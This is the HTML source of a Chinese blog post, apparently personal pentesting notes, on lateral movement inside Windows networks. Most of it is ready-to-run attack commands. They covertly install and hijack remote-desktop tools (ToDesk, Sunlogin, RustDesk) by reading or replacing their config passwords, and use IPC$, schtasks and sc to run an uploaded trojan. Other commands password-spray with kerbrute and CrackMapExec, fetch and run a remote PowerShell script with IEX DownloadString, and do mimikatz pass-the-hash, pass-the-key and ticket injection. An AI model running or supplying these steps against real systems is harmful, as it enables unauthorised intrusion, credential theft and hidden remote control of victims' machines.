@@ -1,0 +1,489 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>横向移动 | 自己愛的な人です</title><meta name="author" content="许木"><meta name="copyright" content="许木"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="发现了内网渗透的狠资料，很强 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;15367#toc-9 上线远控工具，可以直接通过RDP等服务连接其他电脑。 RustDESK上传到目标靶机上，运行。找到RustDesk.toml 1C:\Users\用户名\AppData\Roaming\RustDesk\config  下载到本地后进行添加密码，密码为6位 然后上传替换即可 GoToHTTP(要钱">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="http://example.com/posts/039900e735dd/index.html">
+<meta property="og:site_name" content="自己愛的な人です">
+<meta property="og:description" content="发现了内网渗透的狠资料，很强 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;15367#toc-9 上线远控工具，可以直接通过RDP等服务连接其他电脑。 RustDESK上传到目标靶机上，运行。找到RustDesk.toml 1C:\Users\用户名\AppData\Roaming\RustDesk\config  下载到本地后进行添加密码，密码为6位 然后上传替换即可 GoToHTTP(要钱">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.postimg.cc/qMyfS0yP/henxaing.png">
+<meta property="article:published_time" content="2024-10-17T08:59:42.000Z">
+<meta property="article:modified_time" content="2024-10-17T09:23:59.762Z">
+<meta property="article:author" content="许木">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.postimg.cc/qMyfS0yP/henxaing.png"><link rel="shortcut icon" href="/img/fav.jpg"><link rel="canonical" href="http://example.com/posts/039900e735dd/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '横向移动',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-17 17:23:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/styles/main.css"><script src="https://cubism.live2d.com/sdk-web/cubismcore/live2dcubismcore.min.js"></script><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/xudamu/Doro@3/bundle.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="自己愛的な人です" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.postimg.cc/CxGRhTpQ/e08087412710590d39be232cd643f10f.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.postimg.cc/qMyfS0yP/henxaing.png')"><nav id="nav"><span id="blog-info"><a href="/" title="自己愛的な人です"><span class="site-name">自己愛的な人です</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-17T08:59:42.000Z" title="发表于 2024-10-17 16:59:42">2024-10-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-17T09:23:59.762Z" title="更新于 2024-10-17 17:23:59">2024-10-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="横向移动"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>发现了内网渗透的狠资料，很强</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/15367#toc-9">https://xz.aliyun.com/t/15367#toc-9</a></p>
+<p>上线远控工具，可以直接通过RDP等服务连接其他电脑。</p>
+<h3 id="RustDESK"><a href="#RustDESK" class="headerlink" title="RustDESK"></a>RustDESK</h3><p>上传到目标靶机上，运行。找到RustDesk.toml</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Roaming\RustDesk\config</span><br></pre></td></tr></table></figure>
+
+<p>下载到本地后进行添加密码，密码为6位</p>
+<p>然后上传替换即可</p>
+<h3 id="GoToHTTP-要钱"><a href="#GoToHTTP-要钱" class="headerlink" title="GoToHTTP(要钱)"></a>GoToHTTP(要钱)</h3><p>使用B2C模式。只需要在被控端下载即可，使用浏览器远控对面</p>
+<p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028316-7.png" alt="img"></p>
+<p>上传到靶机，运行后直接查看同目录下的config.ini，能发现明文账号密码</p>
+<h3 id="todesk篇-会被报警，因为用的太多了"><a href="#todesk篇-会被报警，因为用的太多了" class="headerlink" title="todesk篇(会被报警，因为用的太多了)"></a>todesk篇(会被报警，因为用的太多了)</h3><p>类向日葵远控工具。</p>
+<p>由于官方自己提供了静默安装，所以任意新版本都行</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ToDesk.exe /S</span><br></pre></td></tr></table></figure>
+
+<p>然后就是寻找账号密码，然后进行远控即可</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="keyword">type</span> C:\<span class="string">&quot;Program Files (x86)&quot;</span>\ToDesk\config.ini</span><br></pre></td></tr></table></figure>
+
+<p>查看tempAuthPassEx的加密值进行解密即是密码，或者说将其进行覆盖。</p>
+<p>使用本地的todesk的config.ini文件替换目标机器的config.ini即可</p>
+<p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-1.png" alt="img"></p>
+<p>这个是设备识别码</p>
+<p>这个是临时密码</p>
+<p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-2.png" alt="img"></p>
+<p>将本地的这个config.ini上传到目标机器覆盖掉它的config.ini，重启进程即可</p>
+<h3 id="向日葵篇（漏洞已失效，但是可以进行文件替换）"><a href="#向日葵篇（漏洞已失效，但是可以进行文件替换）" class="headerlink" title="向日葵篇（漏洞已失效，但是可以进行文件替换）"></a>向日葵篇（漏洞已失效，但是可以进行文件替换）</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Oray\SunloginClient\config.ini </span><br></pre></td></tr></table></figure>
+
+<p>使用向日葵绿色版进行运行，会在注册表中添加数值</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Oray\SunLogin\SunloginClient</span><br></pre></td></tr></table></figure>
+
+<p>通过提前输入向注册表中写入数值，即可绕过弹出页面框，直接进行控制</p>
+<p>11.reg：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span> </span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Oray\SunLogin\SunloginClient] </span><br><span class="line"><span class="string">&quot;11.1.0.37237_IsRunSeted&quot;</span>=<span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行11.reg即可</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit -s <span class="number">11.</span>reg  注册注册表</span><br><span class="line">SunloginClient.exe 运行向日葵</span><br></pre></td></tr></table></figure>
+
+<p>可以通过运行向日葵后截图进行查看密码，但是会有需要点击向日葵页面才能让那个验证码出来</p>
+<p>所以这里会有一个方法将那个验证码不需要点击就能查看</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="keyword">type</span> C:\ProgramData\Oray\SunloginClient\config.ini</span><br><span class="line">fastcode:本机识别码去掉k</span><br><span class="line">encry_pwd:本机识别码，密文无法直接解密</span><br></pre></td></tr></table></figure>
+
+<p>如果不在config.ini中就在sys_config.ini中</p>
+<p>向日葵识别码解密使用脚本即可解密</p>
+<p>Sunflower.zip</p>
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>运行SunDecrypt.py即可</p>
+<h3 id="计划任务横向移动-环境可能只有老电脑能跑"><a href="#计划任务横向移动-环境可能只有老电脑能跑" class="headerlink" title="计划任务横向移动(环境可能只有老电脑能跑)"></a>计划任务横向移动(环境可能只有老电脑能跑)</h3><p>比如只有windows server 2008</p>
+<p>IPC(Internet ProcessConnection)共享”命名管道”的资源。是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用</p>
+<p>通过IPC$,可以与目标机器建立连接。不仅可以访问目标机器中的文件，进行上传、下载等操作。还可以在上面运行其他命令，获取目标机器的目录结构、用户列表等信息</p>
+<p>利用条件</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>开启了<span class="number">139</span>、<span class="number">445</span>端口</span><br><span class="line">ipcs可以实现远程登录及对默认共享资源的访问，而<span class="number">139</span>端口的开启表示NetBIOS协议的应用。通过<span class="number">139</span>、<span class="number">445</span>端口可以实现对共享文件打印机的访问，因此一般来说，ipcs需要<span class="number">139</span>、<span class="number">445</span>端口的支持</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>管理员开启了默认共享和IPC服务</span><br><span class="line">默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘(c、d、e)等和胸痛目录winnt或者windows(adminS)通过ipc可以实现对这些共享目录的访问，使用net share进行查看</span><br></pre></td></tr></table></figure>
+
+<p>首先建立一个IPC$</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.41</span><span class="number">.30</span>\ipc$<span class="string">&quot;密码&quot;</span> /user:administrator</span><br><span class="line">net use <span class="comment">//查看本地网络连接</span></span><br><span class="line">dir \\xxx.xxx.xxx.xxx\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-3.png" alt="img"></p>
+<p>利用方式-windows自带命令</p>
+<p>然后可能会有权限问题,需要过uac认证</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/332619.html">https://www.freebuf.com/articles/network/332619.html</a></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dir命令</span><br><span class="line">使用netuse命令与远程目标</span><br><span class="line">tasklist 查看进程</span><br><span class="line">查看时间，准备计划任务 net time \\xxx.xxx.xxx.xxx</span><br><span class="line">复制文件 <span class="built_in">copy</span> 文件 \\xxx.xxx.xxx.xxx\C$</span><br><span class="line">建立计划任务</span><br><span class="line">schtasks /create /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f</span><br><span class="line">或者</span><br><span class="line">schtasks /create /u 账号 /p 密码 /s IP地址 /tn 计划任务名 /sc onstart /tr c:\文件 /ru system /f</span><br></pre></td></tr></table></figure>
+
+<h3 id="系统服务横向移动"><a href="#系统服务横向移动" class="headerlink" title="系统服务横向移动"></a>系统服务横向移动</h3><p>先建立IPC连接</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\xxx.xxx.xxx.xxx\ipc$ <span class="string">&quot;admin@123&quot;</span> /user:administrator</span><br></pre></td></tr></table></figure>
+
+<p>将木马上传</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\xxx.exe \\xxx.xxx.xxx.xxx\c$</span><br></pre></td></tr></table></figure>
+
+<p>创建服务</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\xxx.xxx.xxx.xxx create 服务名称 binpath=<span class="string">&quot;cmd.exe /c c:\xxx.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里&#x2F;c就是执行完命令后关闭窗口</p>
+<p>启动服务</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\xxx.xxx.xxx.xxx start 服务名称</span><br></pre></td></tr></table></figure>
+
+<p>服务隐藏()&#x2F;服务伪装()</p>
+<h3 id="Password-Spraying密码喷洒攻击和域内用户枚举-枚举用户"><a href="#Password-Spraying密码喷洒攻击和域内用户枚举-枚举用户" class="headerlink" title="Password Spraying密码喷洒攻击和域内用户枚举(枚举用户)"></a>Password Spraying密码喷洒攻击和域内用户枚举(枚举用户)</h3><p>原理：</p>
+<p>Kerberos本身是一种基于身份认证的协议，在kerberos协议认证的第一阶段AS-REQ，当用户不存在时，返回包提示错误。当用户名存在，密码正确和密码错误时，AS-REP的返回包不一样。所以可以利用这一点，对有域内进行域用户枚举和密码喷洒攻击。在AS-REQ阶段客户端向AS发送用户名，AS对用户名进行验证，用户存在和不存在返回的数据包不一样，所以根据AS的返回包来对域用户进行枚举.</p>
+<p>密码喷洒用一个密码去碰撞很多账号，以避免账号被锁定的问题</p>
+<p>条件</p>
+<p>但当我们用非域内用户时，是不能直接通过这个来命令来查询的。当主机不在域内但是可以域内通信的时候或者在域内但是不是域账户的登录的时候。我们可以采用域控通信进行枚举。</p>
+<p>下面的工具可参考</p>
+<p>工具</p>
+<p>kerbrute工具(用的最多)</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br></pre></td></tr></table></figure>
+
+<p>暂时无法在飞书文档外展示此内容</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute.exe passwordspray -d 域名 用户名字典 指定的密码</span><br></pre></td></tr></table></figure>
+
+<p>CrackMapExec</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></p>
+<p>密码喷洒，然后进行流量代理</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 域名 -u 用户名字典 -p 指定的密码 --<span class="keyword">continue</span>-on-success</span><br></pre></td></tr></table></figure>
+
+<p>DomainPasswordSpray.ps1</p>
+<p>必须是域用户或者是system才行，虽然是system本来就算域用户</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module DomainPasswordSpray.ps1 导入</span><br><span class="line">Invoke-DomainPasswordSpray -UserList <span class="number">1.</span>txt -Domain xxx.com -Password 指定的密码 -OutFile xxx.txt</span><br></pre></td></tr></table></figure>
+
+<p>暂时无法在飞书文档外展示此内容</p>
+<p>其他的命令可以去搜一下,在这里可能需要加上-Force进行强制执行，否则无法成功执行</p>
+<p>如果想在cs中无文件落地进行执行的话</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell.exe -exec bypass -command <span class="string">&quot;&amp;&#123;import-module 在本地的文件地址;执行的命令，比如说Invoke-DomainPasswordSpray -UserList 1.txt -Domain xxx.com -Password 指定的密码 -OutFile xxx.txt&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>远程执行</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell ‐exec bypass ‐c IEX (New‐ObjectSystem.Net.Webclient).DownloadString(<span class="string">&#x27;http://xxx.xxx.xxx.xxx:8080/Invoke‐Portscan.ps1&#x27;</span>);<span class="keyword">import</span>‐module .\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts xxx.xxx.xxx<span class="number">.0</span>/<span class="number">24</span> ‐T <span class="number">4</span> ‐ports <span class="string">&#x27;445,8080,3389,80&#x27;</span> ‐oA c:\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="PTH-Pass-the-Hash-哈希传递-重要"><a href="#PTH-Pass-the-Hash-哈希传递-重要" class="headerlink" title="PTH(Pass the Hash)哈希传递(重要)"></a>PTH(Pass the Hash)哈希传递(重要)</h3><p>深度好文：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8117?time__1311=n4+xnD0Dc7GQDtfK0KDsA3xCq=ErTDgQcApoD">https://xz.aliyun.com/t/8117?time__1311=n4%2BxnD0Dc7GQDtfK0KDsA3xCq%3DErTDgQcApoD</a></p>
+<p>测试环境:</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows server2008</span><br></pre></td></tr></table></figure>
+
+<p>将抓取到的NTLM Hash值进行传递。将域管的NTLM Hash传递给另外的机器，进行登录</p>
+<p>哈希传递前提：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有管理员的NTLM Hash，并且目标机器开放<span class="number">445</span>端口，并且，两台机器的administrator用户账号密码相同</span><br></pre></td></tr></table></figure>
+
+<p>在工作组环境中：</p>
+<p>Windows vista之前的机器，可以使用本地管理员组内进行攻击</p>
+<p>Windows vista之后的机器，只能是使用administrator用户的hash才能进行hash传递攻击</p>
+<p>在域环境中：</p>
+<p>只有管理员组内用户(可以是域管理员组内不是administrator用户)的hash才能进行hash传递攻击，攻击成功后，可以访问域内任意一台同密码机器</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:xxx.com /ntlm:xxxxxxxxxxxxxxx&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里输入完之后是会弹出一个框的，在该弹框中输入内容比如说访问被控的机器是可以的，但是如果是自己手动去开一个窗口，在那里会显示未知的窗口</p>
+<p>创建计划任务</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192.168</span><span class="number">.41</span><span class="number">.20</span> /tn test1 /sc onstart /tr c:\wanli.exe /ru system /f</span><br></pre></td></tr></table></figure>
+
+<p>启动计划任务</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s <span class="number">192.168</span><span class="number">.41</span><span class="number">.20</span> /i /tn <span class="string">&quot;test1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>直接在需要攻击进的域内机器右键运行psexec_psh即可</p>
+<p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-4.png" alt="img"></p>
+<p>选中然后修改domain、执行会话。就可以自动攻击</p>
+<p>psexec_psh的使用可以学习下面这个文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44874645/article/details/121394678">https://blog.csdn.net/qq_44874645/article/details/121394678</a></p>
+<h3 id="Pass-the-Key-PTK-密钥传递攻击"><a href="#Pass-the-Key-PTK-密钥传递攻击" class="headerlink" title="Pass the Key(PTK)密钥传递攻击"></a>Pass the Key(PTK)密钥传递攻击</h3><p>WinXP&#x2F;2003&#x2F;Vista&#x2F;2008，以及未打补丁之前的Win7&#x2F;2008r2&#x2F;8&#x2F;2012这些可以进行NTLM Hash传递，因为可以抓到NTLM明文</p>
+<p>只有在windows8.1&#x2F;2012r2，或者打了补丁的才能复现PTK</p>
+<h5 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h5><p>禁止本地管理员用于远程连接，这样就无法以本地管理员用户的权限执行wmi、psexec、schtasks、at和访问文件共享</p>
+<p>在补丁之后常规的PassTheHash无法成功，唯独默认的Administrator(SID500)账号除外，这个账号依旧可以进行PassTheHash远程连接，即使修改了名字，只需要这个SID500存在即可。</p>
+<p>但是这个补丁能力不强。已经拿到机器了，拿Administrator很轻松，只能减少存储在内存中的凭证数据，也就是让wdigest协议认证的凭证不会存储在lsass.exe，使得我们抓取明文密码的时候无法成功</p>
+<p>除此之外还可以使用AES密钥进行替代NTLM验证进行横向操作。</p>
+<h4 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h4><p>在被控的机器上抓取key</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
+
+<p>查看到域管的aes256_hmac值，将其进行传递</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:xxxx.com /aes256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>即可</p>
+<p>然后需要注意的是，由于传递的是域控的aes256值，虽然可以访问任意机器，但是不能使用ip进行访问，只能使用域名进行访问</p>
+<p>比如说</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC.xxx<span class="number">-1.</span>com\C$</span><br></pre></td></tr></table></figure>
+
+<p>就行了</p>
+<h3 id="Pass-The-Ticket-PTT-票据传递攻击-维权用的"><a href="#Pass-The-Ticket-PTT-票据传递攻击-维权用的" class="headerlink" title="Pass The Ticket(PTT)票据传递攻击(维权用的)"></a>Pass The Ticket(PTT)票据传递攻击(维权用的)</h3><p>就是黄金票据和白银票据，看前面的就行</p>
+<h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::kickets /export&quot;</span>  <span class="comment">//把所有的票据进行导出</span></span><br><span class="line">shell klist purge</span><br><span class="line">或者</span><br><span class="line">mimikatz kerberos::purge  <span class="comment">//清除票据</span></span><br></pre></td></tr></table></figure>
+
+<p>高权限的票据文件注入内存</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt pttxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>上线</p>
